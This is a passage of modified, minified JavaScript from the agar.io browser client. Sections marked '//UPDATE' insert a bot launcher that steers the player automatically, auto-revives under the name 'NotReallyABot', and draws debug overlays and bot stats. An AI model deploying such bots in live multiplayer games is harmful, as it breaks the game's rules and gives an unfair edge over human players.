= null;             try {                 q.close()             } catch (c) {}             q = null         }         Da.la && (a = ""ws://"" + Da.la);         if (null != L) {             var l = L;             L = function() {                 l(b)             }         }         if (tb) {             var d = a.split("":"");             a = d[0] + ""s://ip-"" + d[1].replace(/\\./g, ""-"").replace(/\\//g, """") + "".tech.agar.io:"" + (+d[2] + 2E3)         }         M = [];         k = [];         E = {};         v = [];         Q = [];         F = [];         z = A = null;         R = 0;         $ = !1;         console.log(""Connecting to "" + a);         //UPDATE         serverIP = a;         q = new WebSocket(a);         q.binaryType = ""arraybuffer"";         q.onopen = function() {             var a;             console.log(""socket open"");             a = N(5);             a.setUint8(0, 254);             a.setUint32(1, 5, !0);             O(a);             a = N(5);             a.setUint8(0, 255);             a.setUint32(1, 154669603, !0);             O(a);             a = N(1 + b.length);             a.setUint8(0, 80);             for (var c = 0; c < b.length; ++c) a.setUint8(c + 1, b.charCodeAt(c));             O(a);             $a()         };         q.onmessage = ub;         q.onclose = vb;         q.onerror = function() {             console.log(""socket error"")         }     }      function N(a) {         return new DataView(new ArrayBuffer(a))     }      function O(a) {         q.send(a.buffer)     }      function vb() {         $ && (ma = 500);         console.log(""socket close"");         setTimeout(I, ma);         ma *= 2     }      function ub(a) {         wb(new DataView(a.data))     }      function wb(a) {         function b() {             for (var b = """";;) {                 var d = a.getUint16(c, !0);                 c += 2;                 if (0 == d) break;                 b += String.fromCharCode(d)             }             return b         }         var c = 0;         240 == a.getUint8(c) && (c += 5);         switch (a.getUint8(c++)) {             case 16:                 xb(a, c);                 break;             case 17:                 aa = a.getFloat32(c, !0);                 c += 4;                 ba = a.getFloat32(c, !0);                 c += 4;                 ca = a.getFloat32(c, !0);                 c += 4;                 break;             case 20:                 k = [];                 M = [];                 break;             case 21:                 Ea = a.getInt16(c, !0);                 c += 2;                 Fa = a.getInt16(c, !0);                 c += 2;                 Ga || (Ga = !0, na = Ea, oa = Fa);                 break;             case 32:                 M.push(a.getUint32(c, !0));                 c += 4;                 break;             case 49:                 if (null != A) break;                 var l = a.getUint32(c, !0),                     c = c + 4;                 F = [];                 for (var d = 0; d < l; ++d) {                     var p = a.getUint32(c, !0),                         c = c + 4;                     F.push({                         id: p,                         name: b()                     })                 }                 ab();                 break;             case 50:                 A = [];                 l = a.getUint32(c, !0);                 c += 4;                 for (d = 0; d < l; ++d) A.push(a.getFloat32(c, !0)), c += 4;                 ab();                 break;             case 64:                 pa = a.getFloat64(c, !0);                 c += 8;                 qa = a.getFloat64(c, !0);                 c += 8;                 ra = a.getFloat64(c, !0);                 c += 8;                 sa = a.getFloat64(c, !0);                 c += 8;                 aa = (ra + pa) / 2;                 ba = (sa + qa) / 2;                 ca = 1;                 0 == k.length && (s = aa, t = ba, h = ca);                 break;             case 81:                 var g = a.getUint32(c, !0),                     c = c + 4,                     e = a.getUint32(c, !0),                     c = c + 4,                     f = a.getUint32(c, !0),                     c = c + 4;                 setTimeout(function() {                     S({                         e: g,                         f: e,                         d: f                     })                 }, 1200)         }     }      function xb(a, b) {         bb = C = Date.now();         $ || ($ = !0, e(""#connecting"").hide(), cb(), L && (L(), L = null));         var c = Math.random();         Ha = !1;         var d = a.getUint16(b, !0);         b += 2;         for (var u = 0; u < d; ++u) {             var p = E[a.getUint32(b, !0)],                 g = E[a.getUint32(b + 4, !0)];             b += 8;             p && g && (g.X(), g.s = g.x, g.t = g.y, g.r = g.size, g.J = p.x, g.K = p.y, g.q = g.size, g.Q =                 C)         }         for (u = 0;;) {             d = a.getUint32(b, !0);             b += 4;             if (0 == d) break;             ++u;             var f, p = a.getInt16(b, !0);             b += 4;             g = a.getInt16(b, !0);             b += 4;             f = a.getInt16(b, !0);             b += 2;             for (var h = a.getUint8(b++), w = a.getUint8(b++), m = a.getUint8(b++), h = (h << 16 | w << 8 | m).toString(16); 6 > h.length;) h = ""0"" + h;             var h = ""#"" + h,                 w = a.getUint8(b++),                 m = !!(w & 1),                 r = !!(w & 16);             w & 2 && (b += 4);             w & 4 && (b += 8);             w & 8 && (b += 16);             for (var q, n = """";;) {                 q = a.getUint16(b, !0);                 b += 2;                 if (0 == q) break;                 n += String.fromCharCode(q)             }             q = n;             n = null;             E.hasOwnProperty(d) ? (n = E[d], n.P(), n.s = n.x, n.t = n.y, n.r = n.size, n.color = h) :                 (n = new da(d, p, g, f, h, q), v.push(n), E[d] = n, n.ua = p, n.va = g);             n.h = m;             n.n = r;             n.J = p;             n.K = g;             n.q = f;             n.sa = c;             n.Q = C;             n.ba = w;             q && n.B(q); - 1 != M.indexOf(d) && -1 == k.indexOf(n) && (document.getElementById(""overlays"").style.display = ""none"", k.push(n), n.birth = getLastUpdate(), n.birthMass = (n.size * n.size / 100), 1 == k.length && (s = n.x, t = n.y, db()))              //UPDATE             interNodes[d] = window.getCells()[d];         }          //UPDATE         Object.keys(interNodes).forEach(function(element, index) {             //console.log(""start: "" + interNodes[element].updateTime + "" current: "" + D + "" life: "" + (D - interNodes[element].updateTime));             var isRemoved = !window.getCells().hasOwnProperty(element);              //console.log(""Time not updated: "" + (window.getLastUpdate() - interNodes[element].getUptimeTime()));             if (isRemoved && (window.getLastUpdate() - interNodes[element].getUptimeTime()) > 3000) {                 delete interNodes[element];             } else {                 for (var i = 0; i < getPlayer().length; i++) {                     if (isRemoved && computeDistance(getPlayer()[i].x, getPlayer()[i].y, interNodes[element].x, interNodes[element].y) < getPlayer()[i].size + 710) {                          delete interNodes[element];                         break;                     }                 }             }         });          c = a.getUint32(b, !0);         b += 4;         for (u = 0; u < c; u++) d = a.getUint32(b, !0), b += 4, n = E[d], null != n && n.X();         //UPDATE         //Ha && 0 == k.length && Sa(!1)     }      //UPDATE     function computeDistance(x1, y1, x2, y2) {         var xdis = x1 - x2; // <--- FAKE AmS OF COURSE!         var ydis = y1 - y2;         var distance = Math.sqrt(xdis * xdis + ydis * ydis);          return distance;     }      /**      * Some horse shit of some sort.      * @return Horse Shit      */     function screenDistance() {         return Math.min(computeDistance(getOffsetX(), getOffsetY(), screenToGameX(getWidth()), getOffsetY()), computeDistance(getOffsetX(), getOffsetY(), getOffsetX(), screenToGameY(getHeight())));     }      window.verticalDistance = function() {         return computeDistance(screenToGameX(0), screenToGameY(0), screenToGameX(getWidth()), screenToGameY(getHeight()));     }      /**      * A conversion from the screen\'s horizontal coordinate system      * to the game\'s horizontal coordinate system.      * @param x in the screen\'s coordinate system      * @return x in the game\'s coordinate system      */     window.screenToGameX = function(x) {         return (x - getWidth() / 2) / getRatio() + getX();     }      /**      * A conversion from the screen\'s vertical coordinate system      * to the game\'s vertical coordinate system.      * @param y in the screen\'s coordinate system      * @return y in the game\'s coordinate system      */     window.screenToGameY = function(y) {         return (y - getHeight() / 2) / getRatio() + getY();     }      window.drawPoint = function(x_1, y_1, drawColor, text) {         if (!toggleDraw) {             dPoints.push([x_1, y_1, drawColor]);             dText.push(text);         }     }      window.drawArc = function(x_1, y_1, x_2, y_2, x_3, y_3, drawColor) {         if (!toggleDraw) {             var radius = computeDistance(x_1, y_1, x_3, y_3);             dArc.push([x_1, y_1, x_2, y_2, x_3, y_3, radius, drawColor]);         }     }      window.drawLine = function(x_1, y_1, x_2, y_2, drawColor) {         if (!toggleDraw) {             lines.push([x_1, y_1, x_2, y_2, drawColor]);         }     }      window.drawCircle = function(x_1, y_1, radius, drawColor) {         if (!toggleDraw) {             circles.push([x_1, y_1, radius, drawColor]);         }     }      function V() {          //UPDATE         if (getPlayer().length == 0 && !reviving && ~~(getCurrentScore() / 100) > 0) {             console.log(""Dead: "" + ~~(getCurrentScore() / 100));             apos(\'send\', \'pageview\');         }          if (getPlayer().length == 0) {             console.log(""Revive"");             setNick(originalName);             reviving = true;         } else if (getPlayer().length > 0 && reviving) {             reviving = false;             console.log(""Done Reviving!"");         }          if (T()) {             var a = fa - m / 2;             var b = ga - r / 2;             64 > a * a + b * b || .01 > Math.abs(eb - ia) &&                 .01 > Math.abs(fb - ja) || (eb = ia, fb = ja, a = N(13), a.setUint8(0, 16), a.setInt32(1, ia, !0), a.setInt32(5, ja, !0), a.setUint32(9, 0, !0), O(a))         }     }      function cb() {         if (T() && $ && null != K) {             var a = N(1 + 2 * K.length);             a.setUint8(0, 0);             for (var b = 0; b < K.length; ++b) a.setUint16(1 + 2 * b, K.charCodeAt(b), !0);             O(a)         }     }      function T() {         return null != q && q.readyState == q.OPEN     }      window.opCode = function(a) {         console.log(""Sending op code."");         H(parseInt(a));     }      function H(a) {         if (T()) {             var b = N(1);             b.setUint8(0, a);             O(b)         }     }      function $a() {         if (T() && null != B) {             var a = N(1 + B.length);             a.setUint8(0, 81);             for (var b = 0; b < B.length; ++b) a.setUint8(b + 1, B.charCodeAt(b));             O(a)         }     }      function Ta() {         m = d.innerWidth;         r = d.innerHeight;         za.width = G.width = m;         za.height = G.height = r;         var a = e(""#helloContainer"");         a.css(""transform"", ""none"");         var b = a.height(),             c = d.innerHeight;         b > c / 1.1 ? a.css(""transform"", ""translate(-50%, -50%) scale("" + c / b / 1.1 + "")"") : a.css(""transform"", ""translate(-50%, -50%)"");         gb()     }      function hb() {         var a;         a = Math.max(r / 1080, m / 1920);         return a *= J     }      function yb() {         if (0 != k.length) {             for (var a = 0, b = 0; b < k.length; b++) a += k[b].size;             a = Math.pow(Math.min(64 / a, 1), .4) * hb();             h = (9 * h + a) / 10         }     }      function gb() {         //UPDATE         dPoints = [];         circles = [];         dArc = [];         dText = [];         lines = [];           var a, b = Date.now();         ++zb;         C = b;         if (0 < k.length) {             yb();             for (var c = a = 0, d = 0; d < k.length; d++) k[d].P(), a += k[d].x / k.length, c += k[d].y / k.length;             aa = a;             ba = c;             ca = h;             s = (s + a) / 2;             t = (t + c) / 2;         } else s = (29 * s + aa) / 30, t = (29 * t + ba) / 30, h = (9 * h + ca * hb()) / 10;         qb();         Aa();         Ia || f.clearRect(0, 0, m, r);         Ia ? (f.fillStyle = ta ? ""#111111"" : ""#F2FBFF"", f.globalAlpha = .05, f.fillRect(0, 0, m, r), f.globalAlpha = 1) : Ab();         v.sort(function(a, b) {             return a.size == b.size ? a.id - b.id : a.size - b.size         });         f.save();         f.translate(m / 2, r / 2);         f.scale(h, h);         f.translate(-s, -t);         //UPDATE         f.save();         f.beginPath();         f.lineWidth = 5;         f.strokeStyle = (getDarkBool() ? \'#F2FBFF\' : \'#111111\');         f.moveTo(getMapStartX(), getMapStartY());         f.lineTo(getMapStartX(), getMapEndY());         f.stroke();         f.moveTo(getMapStartX(), getMapStartY());         f.lineTo(getMapEndX(), getMapStartY());         f.stroke();         f.moveTo(getMapEndX(), getMapStartY());         f.lineTo(getMapEndX(), getMapEndY());         f.stroke();         f.moveTo(getMapStartX(), getMapEndY());         f.lineTo(getMapEndX(), getMapEndY());         f.stroke();         f.restore();          for (d = 0; d < v.length; d++) v[d].w(f);         for (d = 0; d < Q.length; d++) Q[d].w(f);         //UPDATE         if (getPlayer().length > 0) {             var moveLoc = window.botList[botIndex].mainLoop();             if (!toggle) {                 setPoint(moveLoc[0], moveLoc[1]);             }         }         customRender(f);         if (Ga) {             na = (3 * na + Ea) / 4;             oa = (3 * oa + Fa) / 4;             f.save();             f.strokeStyle = ""#FFAAAA"";             f.lineWidth = 10;             f.lineCap = ""round"";             f.lineJoin = ""round"";             f.globalAlpha = .5;             f.beginPath();             for (d = 0; d < k.length; d++) f.moveTo(k[d].x, k[d].y), f.lineTo(na, oa);             f.stroke();             f.restore();         }         f.restore();         z && z.width && f.drawImage(z, m - z.width - 10, 10);         R = Math.max(R, Bb());          //UPDATE          var currentDate = new Date();          var nbSeconds = 0;         if (getPlayer().length > 0) {             //nbSeconds = currentDate.getSeconds() + currentDate.getMinutes() * 60 + currentDate.getHours() * 3600 - lifeTimer.getSeconds() - lifeTimer.getMinutes() * 60 - lifeTimer.getHours() * 3600;             nbSeconds = (currentDate.getTime() - lifeTimer.getTime()) / 1000;         }          bestTime = Math.max(nbSeconds, bestTime);          var displayText = \'Score: \' + ~~(R / 100) + "" Current Time: "" + nbSeconds + "" seconds."";          0 != R && (null == ua && (ua = new va(24, ""#FFFFFF"")), ua.C(displayText), c = ua.L(), a = c.width, f.globalAlpha = .2, f.fillStyle = ""#000000"", f.fillRect(10, r - 10 - 24 - 10, a + 10, 34), f.globalAlpha = 1, f.drawImage(c, 15, r -             10 - 24 - 5));         Cb();         b = Date.now() - b;         b > 1E3 / 60 ? D -= .01 : b < 1E3 / 65 && (D += .01);.4 > D && (D = .4);         1 < D && (D = 1);         b = C - ib;         !T() || W ? (x += b / 2E3, 1 < x && (x = 1)) : (x -= b / 300, 0 > x && (x = 0));         0 < x && (f.fillStyle = ""#000000"", f.globalAlpha = .5 * x, f.fillRect(0, 0, m, r), f.globalAlpha = 1);         ib = C          drawStats(f);     }      //UPDATE     function customRender(d) {         d.save();         for (var i = 0; i < lines.length; i++) {             d.beginPath();              d.lineWidth = 5;              if (lines[i][4] == 0) {                 d.strokeStyle = ""#FF0000"";             } else if (lines[i][4] == 1) {                 d.strokeStyle = ""#00FF00"";             } else if (lines[i][4] == 2) {                 d.strokeStyle = ""#0000FF"";             } else if (lines[i][4] == 3) {                 d.strokeStyle = ""#FF8000"";             } else if (lines[i][4] == 4) {                 d.strokeStyle = ""#8A2BE2"";             } else if (lines[i][4] == 5) {                 d.strokeStyle = ""#FF69B4"";             } else if (lines[i][4] == 6) {                 d.strokeStyle = ""#008080"";             } else if (lines[i][4] == 7) {                 d.strokeStyle = (getDarkBool() ? \'#F2FBFF\' : \'#111111\');             } else {                 d.strokeStyle = ""#000000"";             }              d.moveTo(lines[i][0], lines[i][1]);             d.lineTo(lines[i][2], lines[i][3]);              d.stroke();         }         d.restore();         d.save();         for (var i = 0; i < circles.length; i++) {             if (circles[i][3] == 0) {                 d.strokeStyle = ""#FF0000"";             } else if (circles[i][3] == 1) {                 d.strokeStyle = ""#00FF00"";             } else if (circles[i][3] == 2) {                 d.strokeStyle = ""#0000FF"";             } else if (circles[i][3] == 3) {                 d.strokeStyle = ""#FF8000"";             } else if (circles[i][3] == 4) {                 d.strokeStyle = ""#8A2BE2"";             } else if (circles[i][3] == 5) {                 d.strokeStyle = ""#FF69B4"";             } else if (circles[i][3] == 6) {                 d.strokeStyle = ""#008080"";             } else if (circles[i][3] == 7) {                 d.strokeStyle = (getDarkBool() ? \'#F2FBFF\' : \'#111111\');             } else {                 d.strokeStyle = ""#000000"";             }             d.beginPath();              d.lineWidth = 10;             //d.setLineDash([5]);             d.globalAlpha = 0.3;              d.arc(circles[i][0], circles[i][1], circles[i][2], 0, 2 * Math.PI, false);              d.stroke();         }         d.restore();         d.save();         for (var i = 0; i < dArc.length; i++) {             if (dArc[i][7] == 0) {                 d.strokeStyle = ""#FF0000"";             } else if (dArc[i][7] == 1) {                 d.strokeStyle = ""#00FF00"";             } else if (dArc[i][7] == 2) {                 d.strokeStyle = ""#0000FF"";             } else if (dArc[i][7] == 3) {                 d.strokeStyle = ""#FF8000"";             } else if (dArc[i][7] == 4) {                 d.strokeStyle = ""#8A2BE2"";             } else if (dArc[i][7] == 5) {                 d.strokeStyle = ""#FF69B4"";             } else if (dArc[i][7] == 6) {                 d.strokeStyle = ""#008080"";             } else if (dArc[i][7] == 7) {                 d.strokeStyle = (getDarkBool() ? \'#F2FBFF\' : \'#111111\');             } else {                 d.strokeStyle = ""#000000"";             }              d.beginPath();              d.lineWidth = 5;              var ang1 = Math.atan2(dArc[i][1] - dArc[i][5], dArc[i][0] - dArc[i][4]);             var ang2 = Math.atan2(dArc[i][3] - dArc[i][5], dArc[i][2] - dArc[i][4]);              d.arc(dArc[i][4], dArc[i][5], dArc[i][6], ang1, ang2, false);              d.stroke();         }         d.restore();         d.save();         for (var i = 0; i < dPoints.length; i++) {             if (dText[i] == """") {                 var radius = 10;                  d.beginPath();                 d.arc(dPoints[i][0], dPoints[i][1], radius, 0, 2 * Math.PI, false);                  if (dPoints[i][2] == 0) {                     d.fillStyle = ""black"";                 } else if (dPoints[i][2] == 1) {                     d.fillStyle = ""yellow"";                 } else if (dPoints[i][2] == 2) {                     d.fillStyle = ""blue"";                 } else if (dPoints[i][2] == 3) {                     d.fillStyle = ""red"";                 } else if (dPoints[i][2] == 4) {                     d.fillStyle = ""#008080"";                 } else if (dPoints[i][2] == 5) {                     d.fillStyle = ""#FF69B4"";                 } else {                     d.fillStyle = ""#000000"";                 }                  d.fill();                 d.lineWidth = 2;                 d.strokeStyle = \'#003300\';                 d.stroke();             } else {                 var text = new va(18, (getDarkBool() ? \'#F2FBFF\' : \'#111111\'), true, (getDarkBool() ? \'#111111\' : \'#F2FBFF\'));                  text.C(dText[i]);                 var textRender = text.L();                 d.drawImage(textRender, dPoints[i][0] - (textRender.width / 2), dPoints[i][1] - (textRender.height / 2));             }          }         d.restore();     }      function drawStats(d) {         d.save()          sessionScore = Math.max(getCurrentScore(), sessionScore);          var botString = window.botList[botIndex].displayText();          var debugStrings = [];         debugStrings.push(""Bot: "" + window.botList[botIndex].name);         debugStrings.push(""Launcher: AposLauncher "" + aposLauncherVersion);         debugStrings.push(""T - Bot: "" + (!toggle ? ""On"" : ""Off""));         debugStrings.push(""R - Lines: "" + (!toggleDraw ? ""On"" : ""Off""));          for (var i = 0; i < botString.length; i++) {             debugStrings.push(botString[i]);         }          debugStrings.push("""");         debugStrings.push(""Best Score: "" + ~~(sessionScore / 100));         debugStrings.push(""Best Time: "" + bestTime + "" seconds"");         debugStrings.push("""");         debugStrings.push(serverIP);          if (getPlayer().length > 0) {             var offsetX = -getMapStartX();             var offsetY = -getMapStartY();             debugStrings.push(""Location: "" + Math.floor(getPlayer()[0].x + offsetX) + "", "" + Math.floor(getPlayer()[0].y + offsetY));         }          var offsetValue = 20;         var text = new va(18, (getDarkBool() ? \'#F2FBFF\' : \'#111111\'));          for (var i = 0; i < debugStrings.length; i++) {             text.C(debugStrings[i]);             var textRender = text.L();             d.drawImage(textRender, 20, offsetValue);             offsetValue += textRender.height;         }          if (message.length > 0) {             var mRender = [];             var mWidth = 0;             var mHeight = 0;              for (var i = 0; i < message.length; i++) {                 var mText = new va(28, \'#FF0000\', true, \'#000000\');                 mText.C(message[i]);                 mRender.push(mText.L());                  if (mRender[i].width > mWidth) {                     mWidth = mRender[i].width;                 }                 mHeight += mRender[i].height;             }              var mX = getWidth() / 2 - mWidth / 2;             var mY = 20;              d.globalAlpha = 0.4;             d.fillStyle = \'#000000\';             d.fillRect(mX - 10, mY - 10, mWidth + 20, mHeight + 20);             d.globalAlpha = 1;              var mOffset = mY;             for (var i = 0; i < mRender.length; i++) {                 d.drawImage(mRender[i], getWidth() / 2 - mRender[i].width / 2, mOffset);                 mOffset += mRender[i].height;             }         }          d.restore();     }      function Ab() {         f.fillStyle = ta ? ""#111111"" : ""#F2FBFF"";         f.fillRect(0, 0, m, r);         f.save();         f.strokeStyle = ta ? ""#AAAAAA"" : ""#000000"";         f.globalAlpha = .2 * h;         for (var a = m / h, b = r / h, c = (a / 2 - s) % 50; c < a; c += 50) f.beginPath(), f.moveTo(c * h - .5, 0), f.lineTo(c * h - .5, b * h), f.stroke();         for (c = (b / 2 - t) % 50; c < b; c += 50) f.beginPath(), f.moveTo(0, c * h - .5), f.lineTo(a * h, c * h - .5), f.stroke();         f.restore()     }      function Cb() {         if (Qa && Ja.width) {             var a = m / 5;             f.drawImage(Ja, 5, 5, a, a)         }     }      function Bb() {         for (var a = 0, b = 0; b < k.length; b++) a += k[b].q * k[b].q;         return a     }      function ab() {         z = null;         if (null != A || 0 != F.length)             if (null != A || wa) {                 z = document.createElement(""canvas"");                 var a = z.getContext(""2d""),                     b = 60,                     b = null == A ? b + 24 * F.length : b + 180,                     c = Math.min(200, .3 * m) / 200;                 z.width = 200 * c;                 z.height = b * c;                 a.scale(c, c);                 a.globalAlpha = .4;                 a.fillStyle = ""#000000"";                 a.fillRect(0, 0, 200, b);                 a.globalAlpha =                     1;                 a.fillStyle = ""#FFFFFF"";                 c = null;                 c = Z(""leaderboard"");                 a.font = ""30px Ubuntu"";                 a.fillText(c, 100 - a.measureText(c).width / 2, 40);                 if (null == A)                     for (a.font = ""20px Ubuntu"", b = 0; b < F.length; ++b) c = F[b].name || Z(""unnamed_cell""), wa || (c = Z(""unnamed_cell"")), -1 != M.indexOf(F[b].id) ? (k[0].name && (c = k[0].name), a.fillStyle = ""#FFAAAA"") : a.fillStyle = ""#FFFFFF"", c = b + 1 + "". "" + c, a.fillText(c, 100 - a.measureText(c).width / 2, 70 + 24 * b);                 else                     for (b = c = 0; b < A.length; ++b) {                         var d = c + A[b] * Math.PI * 2;                         a.fillStyle = Db[b + 1];                         a.beginPath();                         a.moveTo(100, 140);                         a.arc(100,                             140, 80, c, d, !1);                         a.fill();                         c = d                     }             }     }      function Ka(a, b, c, d, e) {         this.V = a;         this.x = b;         this.y = c;         this.i = d;         this.b = e     }      function da(a, b, c, d, e, p) {         this.id = a;         this.s = this.x = b;         this.t = this.y = c;         this.r = this.size = d;         this.color = e;         this.a = [];         this.W();         this.B(p)     }      function va(a, b, c, d) {         a && (this.u = a);         b && (this.S = b);         this.U = !!c;         d && (this.v = d)     }      function S(a, b) {         var c = ""1"" == e(""#helloContainer"").attr(""data-has-account-data"");         e(""#helloContainer"").attr(""data-has-account-data"", ""1"");         if (null == b && d.localStorage.loginCache) {             var l = JSON.parse(d.localStorage.loginCache);             l.f = a.f;             l.d = a.d;             l.e = a.e;             d.localStorage.loginCache = JSON.stringify(l)         }         if (c) {             var u = +e("".agario-exp-bar .progress-bar-text"").first().text().split(""/"")[0],                 c = +e("".agario-exp-bar .progress-bar-text"").first().text().split(""/"")[1].split("" "")[0],                 l = e("".agario-profile-panel .progress-bar-star"").first().text();             if (l != a.e) S({                 f: c,                 d: c,                 e: l             }, function() {                 e("".agario-profile-panel .progress-bar-star"").text(a.e);                 e("".agario-exp-bar .progress-bar"").css(""width"", ""100%"");                 e("".progress-bar-star"").addClass(""animated tada"").one(""webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend"",                     function() {                         e("".progress-bar-star"").removeClass(""animated tada"")                     });                 setTimeout(function() {                     e("".agario-exp-bar .progress-bar-text"").text(a.d + ""/"" + a.d + "" XP"");                     S({                         f: 0,                         d: a.d,                         e: a.e                     }, function() {                         S(a, b)                     })                 }, 1E3)             });             else {                 var p = Date.now(),                     g = function() {                         var c;                         c = (Date.now() - p) / 1E3;                         c = 0 > c ? 0 : 1 < c ? 1 : c;                         c = c * c * (3 - 2 * c);                         e("".agario-exp-bar .progress-bar-text"").text(~~(u + (a.f - u) * c) + ""/"" + a.d + "" XP"");                         e("".agario-exp-bar .progress-bar"").css(""width"", (88 * (u + (a.f - u) * c) / a.d).toFixed(2) + ""%"");                         1 > c ? d.requestAnimationFrame(g) : b && b()                     };                 d.requestAnimationFrame(g)              }         } else e("".agario-profile-panel .progress-bar-star"").text(a.e),             e("".agario-exp-bar .progress-bar-text"").text(a.f + ""/"" + a.d + "" XP""), e("".agario-exp-bar .progress-bar"").css(""width"", (88 * a.f / a.d).toFixed(2) + ""%""), b && b()      }      function jb(a) {         ""string"" == typeof a && (a = JSON.parse(a));         Date.now() + 18E5 > a.ja ? e(""#helloContainer"").attr(""data-logged-in"", ""0"") : (d.localStorage.loginCache = JSON.stringify(a), B = a.fa, e("".agario-profile-name"").text(a.name), $a(), S({             f: a.f,             d: a.d,             e: a.e         }), e(""#helloContainer"").attr(""data-logged-in"", ""1""))     }      function Eb(a) {         a = a.split(""\\n"");         jb({             name: a[0],             ta: a[1],             fa: a[2],             ja: 1E3 *                 +a[3],             e: +a[4],             f: +a[5],             d: +a[6]         });         console.log(""Hello Facebook?"");     }      function La(a) {         if (""connected"" == a.status) {             var b = a.authResponse.accessToken;             d.FB.api(""/me/picture?width=180&height=180"", function(a) {                 d.localStorage.fbPictureCache = a.data.url;                 e("".agario-profile-picture"").attr(""src"", a.data.url)             });             e(""#helloContainer"").attr(""data-logged-in"", ""1"");             null != B ? e.ajax(""https://m.agar.io/checkToken"", {                 error: function() {                     console.log(""Facebook Fail!"");                     B = null;                     La(a)                 },                 success: function(a) {                     a = a.split(""\\n"");                     S({                         e: +a[0],                         f: +a[1],                         d: +a[2]                     });                     console.log(""Facebook connected!"");                 },                 dataType: ""text"",                 method: ""POST"",                 cache: !1,                 crossDomain: !0,                 data: B             }) : e.ajax(""https://m.agar.io/facebookLogin"", {                 error: function() {                     console.log(""You have a Facebook problem!"");                     B = null;                     e(""#helloContainer"").attr(""data-logged-in"", ""0"")                 },                 success: Eb,                 dataType: ""text"",                 method: ""POST"",                 cache: !1,                 crossDomain: !0,                 data: b             })         }     }      function Wa(a) {         Y("":party"");         e(""#helloContainer"").attr(""data-party-state"", ""4"");         a = decodeURIComponent(a).replace(/.*#/gim, """");         Ma(""#"" + d.encodeURIComponent(a));         e.ajax(Na + ""//m.agar.io/getToken"", {             error: function() {                 e(""#helloContainer"").attr(""data-party-state"", ""6"")             },             success: function(b) {                 b = b.split(""\\n"");                 e("".partyToken"").val(""agar.io/#"" +                     d.encodeURIComponent(a));                 e(""#helloContainer"").attr(""data-party-state"", ""5"");                 Y("":party"");                 Ca(""ws://"" + b[0], a)             },             dataType: ""text"",             method: ""POST"",             cache: !1,             crossDomain: !0,             data: a         })     }      function Ma(a) {         d.history && d.history.replaceState && d.history.replaceState({}, d.document.title, a)     }     if (!d.agarioNoInit) {         var Na = d.location.protocol,             tb = ""https:"" == Na,             xa = d.navigator.userAgent;         if (-1 != xa.indexOf(""Android"")) d.ga && d.ga(""send"", ""event"", ""MobileRedirect"", ""PlayStore""), setTimeout(function() {                 d.location.href = ""market://details?id=com.miniclip.agar.io""             },             1E3);         else if (-1 != xa.indexOf(""iPhone"") || -1 != xa.indexOf(""iPad"") || -1 != xa.indexOf(""iPod"")) d.ga && d.ga(""send"", ""event"", ""MobileRedirect"", ""AppStore""), setTimeout(function() {             d.location.href = ""https://itunes.apple.com/app/agar.io/id995999703""         }, 1E3);         else {             var za, f, G, m, r, X = null,                  //UPDATE                 toggle = false,                 toggleDraw = false,                 tempPoint = [0, 0, 1],                 dPoints = [],                 circles = [],                 dArc = [],                 dText = [],                 lines = [],                 names = [""NotReallyABot""],                 originalName = names[Math.floor(Math.random() * names.length)],                 sessionScore = 0,                 serverIP = """",                 interNodes = [],                 lifeTimer = new Date(),                 bestTime = 0,                 botIndex = 0,                 reviving = false,                 message = [],                  q = null,                 s = 0,                 t = 0,                 M = [],                 k = [],                 E = {},                 v = [],                 Q = [],                 F = [],                 fa = 0,                 ga = 0,                  //UPDATE                 ia = -1,                 ja = -1,                  zb = 0,                 C = 0,                 ib = 0,                 K = null,                 pa = 0,                 qa = 0,                 ra = 1E4,                 sa = 1E4,                 h = 1,                 y = null,                 kb = !0,                 wa = !0,                 Oa = !1,                 Ha = !1,                 R = 0,                 ta = !1,                 lb = !1,                 aa = s = ~~((pa + ra) / 2),                 ba = t = ~~((qa + sa) / 2),                 ca = 1,                 P = """",                 A = null,                 ya = !1,                 Ga = !1,                 Ea = 0,                 Fa =                 0,                 na = 0,                 oa = 0,                 mb = 0,                 Db = [""#333333"", ""#FF3333"", ""#33FF33"", ""#3333FF""],                 Ia = !1,                 $ = !1,                 bb = 0,                 B = null,                 J = 1,                 x = 1,                 W = !0,                 Ba = 0,                 Da = {};             (function() {                 var a = d.location.search;                 ""?"" == a.charAt(0) && (a = a.slice(1));                 for (var a = a.split(""&""), b = 0; b < a.length; b++) {                     var c = a[b].split(""="");                     Da[c[0]] = c[1]                 }             })();             var Qa = ""ontouchstart"" in d && /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(d.navigator.userAgent),                 Ja = new Image;             Ja.src = ""img/split.png"";             var nb = document.createElement(""canvas"");             if (""undefined"" == typeof console || ""undefined"" ==                 typeof DataView || ""undefined"" == typeof WebSocket || null == nb || null == nb.getContext || null == d.localStorage) alert(""You browser does not support this game, we recommend you to use Firefox to play this"");             else {                 var ka = null;                 d.setNick = function(a) {                     //UPDATE                     originalName = a;                     if (getPlayer().length == 0) {                         lifeTimer = new Date();                     }                      Xa();                     K = a;                     cb();                     R = 0                 };                 d.setRegion = ha;                 d.setSkins = function(a) {                     kb = a                 };                 d.setNames = function(a) {                     wa = a                 };                 d.setDarkTheme = function(a) {                     ta = a                 };                 d.setColors = function(a) {                     Oa = a                 };                 d.setShowMass = function(a) {                     lb = a                 };                 d.spectate = function() {                     K = null;                     H(1);                     Xa()                 };                 d.setGameMode = function(a) {                     a != P && ("":party"" ==                         P && e(""#helloContainer"").attr(""data-party-state"", ""0""), Y(a), "":party"" != a && I())                 };                 d.setAcid = function(a) {                     Ia = a                 };                 null != d.localStorage && (null == d.localStorage.AB9 && (d.localStorage.AB9 = 0 + ~~(100 * Math.random())), mb = +d.localStorage.AB9, d.ABGroup = mb);                 e.get(Na + ""//gc.agar.io"", function(a) {                     var b = a.split("" "");                     a = b[0];                     b = b[1] || """"; - 1 == [""UA""].indexOf(a) && ob.push(""ussr"");                     ea.hasOwnProperty(a) && (""string"" == typeof ea[a] ? y || ha(ea[a]) : ea[a].hasOwnProperty(b) && (y || ha(ea[a][b])))                 }, ""text"");                 d.ga && d.ga(""send"", ""event"", ""User-Agent"", d.navigator.userAgent, {                     nonInteraction: 1                 });                 var la = !1,                     Ya = 0;                 setTimeout(function() {                     la = !0                 }, Math.max(6E4 * Ya, 1E4));                 var ea = {                         AF: ""JP-Tokyo"",                         AX: ""EU-London"",                         AL: ""EU-London"",                         DZ: ""EU-London"",                         AS: ""SG-Singapore"",                         AD: ""EU-London"",                         AO: ""EU-London"",                         AI: ""US-Atlanta"",                         AG: ""US-Atlanta"",                         AR: ""BR-Brazil"",                         